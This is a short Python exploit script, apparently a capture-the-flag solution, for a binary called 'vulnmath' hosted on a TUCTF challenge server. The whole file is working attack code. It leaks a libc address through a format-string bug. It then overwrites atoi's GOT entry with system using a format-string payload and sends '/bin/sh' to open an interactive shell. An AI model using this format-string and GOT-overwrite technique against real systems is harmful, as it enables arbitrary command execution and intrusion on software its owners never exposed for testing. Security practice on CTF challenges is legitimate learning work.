from ptrlib import *

elf = ELF("./vulnmath")
#"""
libc = ELF("./libc.so.6")
sock = Socket("chal.tuctf.com", 30502)
"""
libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
sock = Process("./vulnmath")
#"""

# leak libc
sock.sendafter("> ", "%23$p")
sock.recvline()
libc_base = int(sock.recvline(), 16) - libc.symbol('__libc_start_main') - 0xf9
logger.info('libc = ' + hex(libc_base))

# overwrite got
payload = fsb(
    writes = {elf.got('atoi'): libc_base + libc.symbol('system')},
    pos=6,
    written=0,
    bs=2,
    bits=32
)
sock.sendafter("> ", payload)
sock.recvline()
sock.recvline()

sock.sendafter("> ", "/bin/sh\x00")

sock.interactive()
